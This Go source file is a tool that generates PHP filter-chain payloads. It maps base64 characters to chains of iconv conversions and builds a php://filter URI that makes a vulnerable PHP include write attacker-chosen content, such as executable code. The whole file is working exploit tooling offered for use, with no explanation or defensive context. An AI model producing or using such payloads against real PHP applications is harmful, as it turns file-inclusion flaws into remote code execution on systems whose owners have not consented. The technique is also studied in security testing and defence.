package main

import (
        "encoding/base64"
        "flag"
        "fmt"
        "regexp"
        "strings"
)

var fileToUse = "php://temp"

var conversions = map[string]string{
	"0": "convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2",
    "1": "convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4",
    "2": "convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921",
    "3": "convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE",
    "4": "convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE",
    "5": "convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2",
    "6": "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2",
    "7": "convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4",
    "8": "convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2",
    "9": "convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB",
    "A": "convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213",
    "a": "convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE",
    "B": "convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000",
    "b": "convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE",
    "C": "convert.iconv.UTF8.CSISO2022KR",
    "c": "convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2",
    "D": "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213",
    "d": "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5",
    "E": "convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT",
    "e": "convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937",
    "F": "convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB",
    "f": "convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213",
    "g": "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8",
    "G": "convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90",
    "H": "convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213",
    "h": "convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE",
    "I": "convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213",
    "i": "convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000",
    "J": "convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4",
    "j": "convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16",
    "K": "convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE",
    "k": "convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2",
    "L": "convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC",
    "l": "convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE",
    "M": "convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T",
    "m": "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949",
    "N": "convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4",
    "n": "convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61",
    "O": "convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775",
    "o": "convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE",
    "P": "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB",
    "p": "convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4",
    "q": "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2",
    "Q": "convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2",
    "R": "convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4",
    "r": "convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101",
    "S": "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS",
    "s": "convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90",
    "T": "convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103",
    "t": "convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS",
    "U": "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943",
    "u": "convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61",
    "V": "convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB",
    "v": "convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2",
    "W": "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936",
    "w": "convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE",
    "X": "convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932",
    "x": "convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS",
    "Y": "convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361",
    "y": "convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT",
    "Z": "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16",
    "z": "convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937",
    "/": "convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4",
    "+": "convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157",
    "=": "",
}

func generateFilterChain(chain string, debugBase64 bool) string {
        encodedChain := chain
        filters := "convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|"

        for i := len(encodedChain) - 1; i >= 0; i-- {
                c := string(encodedChain[i])
                filters += conversions[c] + "|"
                filters += "convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|"
        }

        if !debugBase64 {
                filters += "convert.base64-decode"
        }

        finalPayload := fmt.Sprintf("php://filter/%s/resource=%s", filters, fileToUse)
        return finalPayload
}

func main() {
        chain := flag.String("chain", "", "Content you want to generate.")
        rawBase64 := flag.String("rawbase64", "", "The base64 value you want to test.")
        flag.Parse()

        if *chain != "" {
                chainBytes := []byte(*chain)
                base64Value := base64.StdEncoding.EncodeToString(chainBytes)
                base64Value = strings.Replace(base64Value, "=", "", -1)
                filterChain := generateFilterChain(base64Value, false)
                fmt.Printf("[+] The following gadget chain will generate the following code : %s (base64 value: %s)\n", *chain, base64Value)
                fmt.Println(filterChain)
        }

        if *rawBase64 != "" {
                rawBase64Value := strings.Replace(*rawBase64, "=", "", -1)
                match, _ := regexp.MatchString("^([A-Za-z0-9+/])*$", rawBase64Value)
                if match {
                        filterChain := generateFilterChain(rawBase64Value, true)
                        fmt.Println(filterChain)
                } else {
                        fmt.Println("[-] Base64 string required.")
                }
        }
}
